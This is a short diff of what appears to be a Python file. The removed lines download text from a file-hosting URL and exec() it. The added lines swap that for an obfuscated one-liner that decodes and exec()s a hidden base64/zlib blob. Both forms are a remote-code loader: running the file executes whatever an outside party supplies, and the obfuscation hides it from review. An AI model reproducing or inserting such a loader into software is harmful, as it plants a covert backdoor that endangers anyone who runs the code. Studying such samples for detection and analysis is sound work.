@@ -1,10 +1,2 @@
-
-import urllib.request
-import subprocess
-import sys
-import os
-
-url = 'https://files.catbox.moe/xfa0x3.txt'
-req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-code = urllib.request.urlopen(req).read().decode()
-exec(code)
+# Python obfuscation by pyobfuscator.com
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AXTBxqXs5NqHNXIo9u8uzYp9NBxOYCva0UUo6X4XnNION1ORd3oTcPS3qUmLq+jsoxD2Cq5hbgfTg8HRhrkm/uT85mgIcCFxvjLbrc1fIC2N3634wCeucnPLjUnSVjUKloEXs9m/Lmto0ZdL3xCLC4oGWLsHjiWVERnjDTD7AHVHKYIur/XE8N9OZcDEV3GjNIF2qYWIMINmIokobR8tPRUEjAKsbjlxJe'))
